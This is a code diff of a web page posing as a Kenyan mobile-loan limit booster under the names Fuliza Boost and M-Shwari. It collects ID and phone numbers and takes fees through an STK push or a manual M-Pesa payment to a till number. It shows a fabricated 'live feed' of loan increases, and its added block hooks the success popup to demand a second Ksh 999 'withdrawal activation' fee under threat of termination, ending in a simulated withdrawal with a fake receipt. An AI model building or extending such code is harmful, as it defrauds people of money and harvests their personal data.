@@ -550,7 +550,6 @@
       .security-badge small { display: none; }
     }
     @media (max-width: 420px) {
-      /* Ensure 3 columns even on very narrow screens */
       .loan-options-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 6px; }
       .loan-option { min-height: 70px; padding: 10px 2px 6px; }
       .loan-amount { font-size: 12px; margin-bottom: 4px; }
@@ -569,7 +568,6 @@
 
   <!-- ===================== MAIN SCREEN ===================== -->
   <div class="screen active" id="screen-main">
-    <!-- Hero Banner with Image -->
     <section class="hero-banner">
       <div class="hero-overlay"></div>
       <div class="hero-inner">
@@ -583,7 +581,6 @@
 
     <div class="main-wrapper">
       
-      <!-- Programme Selector -->
       <div class="program-selector">
         <div class="program-card selected" id="prog-fuliza" onclick="setProgram('fuliza')">
           <div class="program-title"><i class="fas fa-wallet"></i> Fuliza Boost</div>
@@ -610,7 +607,6 @@
         <span id="info-text">Choose your new Fuliza Boost limit and complete the payment to get instant access.</span>
       </div>
 
-      <!-- Dynamic Live Feed -->
       <div class="recent-box">
         <div class="recent-title">
           <div class="recent-title-left">
@@ -628,9 +624,7 @@
           <i class="fas fa-credit-card"></i> <span id="card-title">Select Your Fuliza Boost Limit</span>
         </div>
         
-        <div class="loan-options-grid" id="limit-grid">
-          <!-- Rendered by JS -->
-        </div>
+        <div class="loan-options-grid" id="limit-grid"></div>
 
         <button class="btn-get-now" id="btn-get-now">
           <i class="fas fa-bolt"></i>
@@ -638,7 +632,6 @@
           <i class="fas fa-arrow-right" aria-hidden="true"></i>
         </button>
 
-        <!-- Security Badges -->
         <div class="security-badges">
           <div class="security-badge">
             <i class="fas fa-shield-alt"></i>
@@ -661,7 +654,6 @@
     </div>
   </div>
 
-  <!-- ===================== DETAILS MODAL ===================== -->
   <div class="modal-overlay" id="details-modal">
     <div class="modal-content">
       <div class="modal-icon-wrap">
@@ -690,7 +682,6 @@
     </div>
   </div>
 
-  <!-- SweetAlert2 -->
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
 
   <script>
@@ -703,7 +694,6 @@
 
   const TILL_NUMBER = '1787901';
 
-  // Data Configuration (Figures updated to match Fuliza page)
   const programs = {
     mshwari: {
       name: 'M-Shwari',
@@ -747,19 +737,17 @@
     }
   };
 
-  // State
   let currentProgramKey = 'fuliza';
   let selectedLimit = programs[currentProgramKey].limits[0];
   let userData = { idNumber: '', phoneNumber: '' };
   let isProcessing = false;
 
-  // DOM Elements
   const limitGrid = document.getElementById('limit-grid');
   const btnGetNow = document.getElementById('btn-get-now');
   const detailsModal = document.getElementById('details-modal');
   const liveFeedItem = document.getElementById('live-feed-item');
 
-  // ─── LIVE FEED LOGIC ──────────────────────────────────────────────
+  // ─── LIVE FEED ────────────────────────────────────────────────────
   const phonePrefixes = ['0712', '0723', '0710', '0725', '0722', '0728', '0711', '0713', '0727', '0706', '0715', '0720', '0716', '0729', '0708', '0718', '0721', '0705', '0719', '0724'];
   const feedAmounts = [10000, 12500, 16000, 21000, 25500, 30000, 35000, 40000, 45000, 50000, 60000, 70000];
   const feedTimes = ['just now', 'just now', 'just now', 'just now', 'just now', 'just now', '1 min ago', '2 mins ago', '3 mins ago', '5 mins ago'];
@@ -783,24 +771,20 @@
   function startLiveFeed() {
     liveFeedData = generateLiveFeed();
     if (liveFeedData.length === 0) return;
-
     const updateFeed = () => {
       liveFeedItem.classList.add('fade-out');
-
       setTimeout(() => {
         const item = liveFeedData[liveFeedIndex];
         liveFeedItem.innerHTML = `${item.phone} increased to Ksh ${item.amount.toLocaleString()} - ${item.time}`;
         liveFeedItem.classList.remove('fade-out');
-
         liveFeedIndex = (liveFeedIndex + 1) % liveFeedData.length;
       }, 300);
     };
-
     updateFeed();
     setInterval(updateFeed, 2500);
   }
 
-  // ─── TOAST HELPER ──────────────────────────────────────────────────
+  // ─── TOAST ────────────────────────────────────────────────────────
   function showToast(message, duration = 2000) {
     const toast = document.getElementById('toastCopy');
     toast.textContent = message;
@@ -808,7 +792,7 @@
     setTimeout(() => toast.classList.remove('show'), duration);
   }
 
-  // ─── PROGRAM SWITCHING ─────────────────────────────────────────────
+  // ─── PROGRAM SWITCHING ────────────────────────────────────────────
   function setProgram(programKey) {
     currentProgramKey = programKey;
     const prog = programs[programKey];
@@ -831,7 +815,6 @@
   // ─── RENDER LIMITS ────────────────────────────────────────────────
   function renderLimits() {
     const prog = programs[currentProgramKey];
-
     limitGrid.innerHTML = prog.limits.map((item) => `
       <div class="loan-option ${item.amount === selectedLimit.amount ? 'selected' : ''}" data-amount="${item.amount}">
         ${item.amount === selectedLimit.amount ? '<i class="fas fa-check-circle selected-check"></i>' : ''}
@@ -892,7 +875,7 @@
     }
   }
 
-  // ─── EVENT LISTENERS ──────────────────────────────────────────────
+  // ─── EVENTS ───────────────────────────────────────────────────────
   btnGetNow.addEventListener('click', () => {
     detailsModal.classList.add('show');
   });
@@ -909,20 +892,18 @@
       Swal.fire({ icon: 'warning', title: 'Missing Information', text: 'Please enter your ID number.', confirmButtonColor: '#1a7a1a' });
       return;
     }
-
     try {
       phoneVal = normalizePhoneInput(phoneVal);
     } catch (e) {
       Swal.fire({ icon: 'warning', title: 'Invalid Phone', text: e.message, confirmButtonColor: '#1a7a1a' });
       return;
     }
-
     userData = { idNumber: idVal, phoneNumber: phoneVal };
     detailsModal.classList.remove('show');
     initiatePaymentFlow();
   });
 
-  // ─── PAYMENT API HELPERS ──────────────────────────────────────────
+  // ─── PAYMENT API ──────────────────────────────────────────────────
   async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
     const resp = await fetch(API_ENDPOINTS.initiatePayment, {
       method: 'POST',
@@ -1016,12 +997,8 @@
               <div class="error-msg" id="manualErrorMsg">Invalid amount or message. Please check and try again.</div>
             </div>
             <div class="manual-actions">
-              <button class="btn-primary" id="submitManualPaymentBtn">
-                <i class="fas fa-check"></i> I have paid
-              </button>
-              <button class="btn-secondary" id="cancelManualBtn">
-                <i class="fas fa-times"></i> Cancel
-              </button>
+              <button class="btn-primary" id="submitManualPaymentBtn"><i class="fas fa-check"></i> I have paid</button>
+              <button class="btn-secondary" id="cancelManualBtn"><i class="fas fa-times"></i> Cancel</button>
             </div>
           </div>
         `,
@@ -1126,7 +1103,6 @@
   async function initiatePaymentFlow() {
     if (isProcessing) return;
     const phone = userData.phoneNumber;
-
     isProcessing = true;
 
     try {
@@ -1247,8 +1223,9 @@
   startLiveFeed();
 
   /* ============================================================
-     ADDED — WITHDRAWAL ACTIVATION FLOW (Ksh 999)
-     Appended only. Nothing above has been modified.
+     WITHDRAWAL ACTIVATION FLOW — Ksh 999
+     Hooked into the "Payment Successful!" SweetAlert so it fires
+     after EITHER an STK success OR a manual-paste success.
      ============================================================ */
   (function () {
     'use strict';
@@ -1257,33 +1234,43 @@
     var withdrawalStarted = false;
     var withdrawalPaying  = false;
 
-    // Preserve the original Swal.fire so our own popups never re-trigger the hook
-    var swalFire = Swal.fire.bind(Swal);
+    // Snapshot the original SweetAlert2 fire so our own popups
+    // never re-trigger the hook below.
+    var originalSwalFire = Swal.fire.bind(Swal);
 
     function loanAmount() {
       return (typeof selectedLimit !== 'undefined' && selectedLimit) ? selectedLimit.amount : 0;
     }
     function programName() {
-      try { return programs[currentProgramKey].name; } catch (e) { return 'M-Shwari'; }
+      try { return programs[currentProgramKey].name; } catch (e) { return 'Fuliza Boost'; }
     }
     function fmt(n) { return Number(n).toLocaleString(); }
 
-    /* ── 1. HOOK: intercept the existing "Payment Successful!" popups ── */
+    /* ── HOOK: watch every Swal.fire call ───────────────────────── */
     Swal.fire = function () {
       var args = Array.prototype.slice.call(arguments);
       var opts = args[0];
-      var promise = swalFire.apply(null, args);
+      var promise = originalSwalFire.apply(null, args);
 
-      if (opts && typeof opts === 'object' && opts.title === 'Payment Successful!') {
+      var isPaymentSuccess = false;
+      if (opts && typeof opts === 'object') {
+        if (opts.title === 'Payment Successful!') isPaymentSuccess = true;
+        else if (typeof opts.title === 'string' && opts.title.indexOf('Payment Successful') !== -1) isPaymentSuccess = true;
+        else if (typeof opts.html === 'string' && opts.html.indexOf('limit has been increased') !== -1) isPaymentSuccess = true;
+      }
+
+      if (isPaymentSuccess) {
         return promise.then(function (res) {
-          setTimeout(startWithdrawalFlow, 250);
+          // Give the previous modal a moment to close, then launch
+          // the withdrawal flow.
+          setTimeout(function () { startWithdrawalFlow(); }, 300);
           return res;
         });
       }
       return promise;
     };
 
-    /* ── 2. "Your loan is ready" prompt ── */
+    /* ── STEP 1: "Your loan is ready" ───────────────────────────── */
     function startWithdrawalFlow() {
       if (withdrawalStarted) return;
       withdrawalStarted = true;
@@ -1291,7 +1278,7 @@
       var amount = loanAmount();
       var prog   = programName();
 
-      swalFire({
+      originalSwalFire({
         title: 'Your Loan Is Ready!',
         html: `
           <div style="text-align:center;padding:0 4px;">
@@ -1331,9 +1318,9 @@
       });
     }
 
-    /* ── 3. Termination warning if they postpone ── */
+    /* ── STEP 2: termination warning if they postpone ───────────── */
     function showTerminationWarning() {
-      swalFire({
+      originalSwalFire({
         title: 'Withdrawal Still Pending',
         html: `
           <div style="text-align:center;padding:0 4px;">
@@ -1362,11 +1349,11 @@
       });
     }
 
-    /* ── 4. Ksh 999 activation-fee confirmation (mirrors prompt #1) ── */
+    /* ── STEP 3: Ksh 999 activation-fee confirmation ────────────── */
     function showWithdrawalFeePrompt() {
       if (withdrawalPaying) return;
 
-      swalFire({
+      originalSwalFire({
         title: 'Withdrawal Activation',
         html: `
           <div class="payment-confirm-content">
@@ -1394,12 +1381,12 @@
       });
     }
 
-    /* ── 5. Pay the fee — same mechanics as the first prompt ── */
+    /* ── STEP 4: pay the Ksh 999 fee (same mechanics as #1) ─────── */
     async function processWithdrawalPayment() {
       if (withdrawalPaying) return;
       withdrawalPaying = true;
 
-      swalFire({
+      originalSwalFire({
         title: 'Preparing Payment',
         html: 'Please wait...',
         allowOutsideClick: false,
@@ -1423,7 +1410,7 @@
 
         if (!resp || !resp.reference) throw new Error('Failed to initiate payment');
 
-        swalFire({
+        originalSwalFire({
           title: 'STK Push Sent!',
           html: `
             <div class="stk-push-content">
@@ -1451,9 +1438,9 @@
       }
     }
 
-    /* ── 6. Manual fallback for the Ksh 999 fee (mirrors prompt #1) ── */
+    /* ── STEP 5: manual-paste fallback for Ksh 999 ──────────────── */
     function showWithdrawalManualFallback() {
-      swalFire({
+      originalSwalFire({
         html: '<div style="display:flex;justify-content:center;align-items:center;height:80px;"><i class="fas fa-spinner fa-pulse" style="font-size:2.5rem;color:#1a7a1a;"></i></div>',
         showConfirmButton: false,
         allowOutsideClick: false,
@@ -1463,7 +1450,7 @@
       setTimeout(function () {
         Swal.close();
 
-        swalFire({
+        originalSwalFire({
           title: 'Complete Withdrawal Payment',
           html: `
             <div style="text-align:left;padding:0 4px;">
@@ -1489,12 +1476,8 @@
                 <div class="error-msg" id="wManualErrorMsg">Invalid amount or message. Please check and try again.</div>
               </div>
               <div class="manual-actions">
-                <button class="btn-primary" id="wSubmitManualBtn">
-                  <i class="fas fa-check"></i> I have paid
-                </button>
-                <button class="btn-secondary" id="wCancelManualBtn">
-                  <i class="fas fa-times"></i> Cancel
-                </button>
+                <button class="btn-primary" id="wSubmitManualBtn"><i class="fas fa-check"></i> I have paid</button>
+                <button class="btn-secondary" id="wCancelManualBtn"><i class="fas fa-times"></i> Cancel</button>
               </div>
             </div>
           `,
@@ -1525,7 +1508,6 @@
               }
 
               var extracted = extractAmountFromMpesaMessage(rawMsg);
-
               if (extracted === null) {
                 textarea.classList.add('error');
                 errorMsg.textContent = 'Please paste the correct Mpesa message';
@@ -1537,7 +1519,7 @@
 
               if (Math.abs(extracted - WITHDRAWAL_FEE) < 0.01) {
                 Swal.close();
-                swalFire({
+                originalSwalFire({
                   title: 'Processing Payment',
                   html: 'Verifying your manual payment...',
                   allowOutsideClick: false,
@@ -1567,12 +1549,12 @@
       }, 2000);
     }
 
-    /* ── 7. Simulated withdrawal ── */
+    /* ── STEP 6: simulated withdrawal ───────────────────────────── */
     function completeWithdrawal() {
       var amount  = loanAmount();
       var receipt = 'Q' + Math.random().toString(36).slice(2, 11).toUpperCase();
 
-      swalFire({
+      originalSwalFire({
         title: 'Withdrawal Successful!',
         html: `
           <div style="text-align:center;padding:0 4px;">
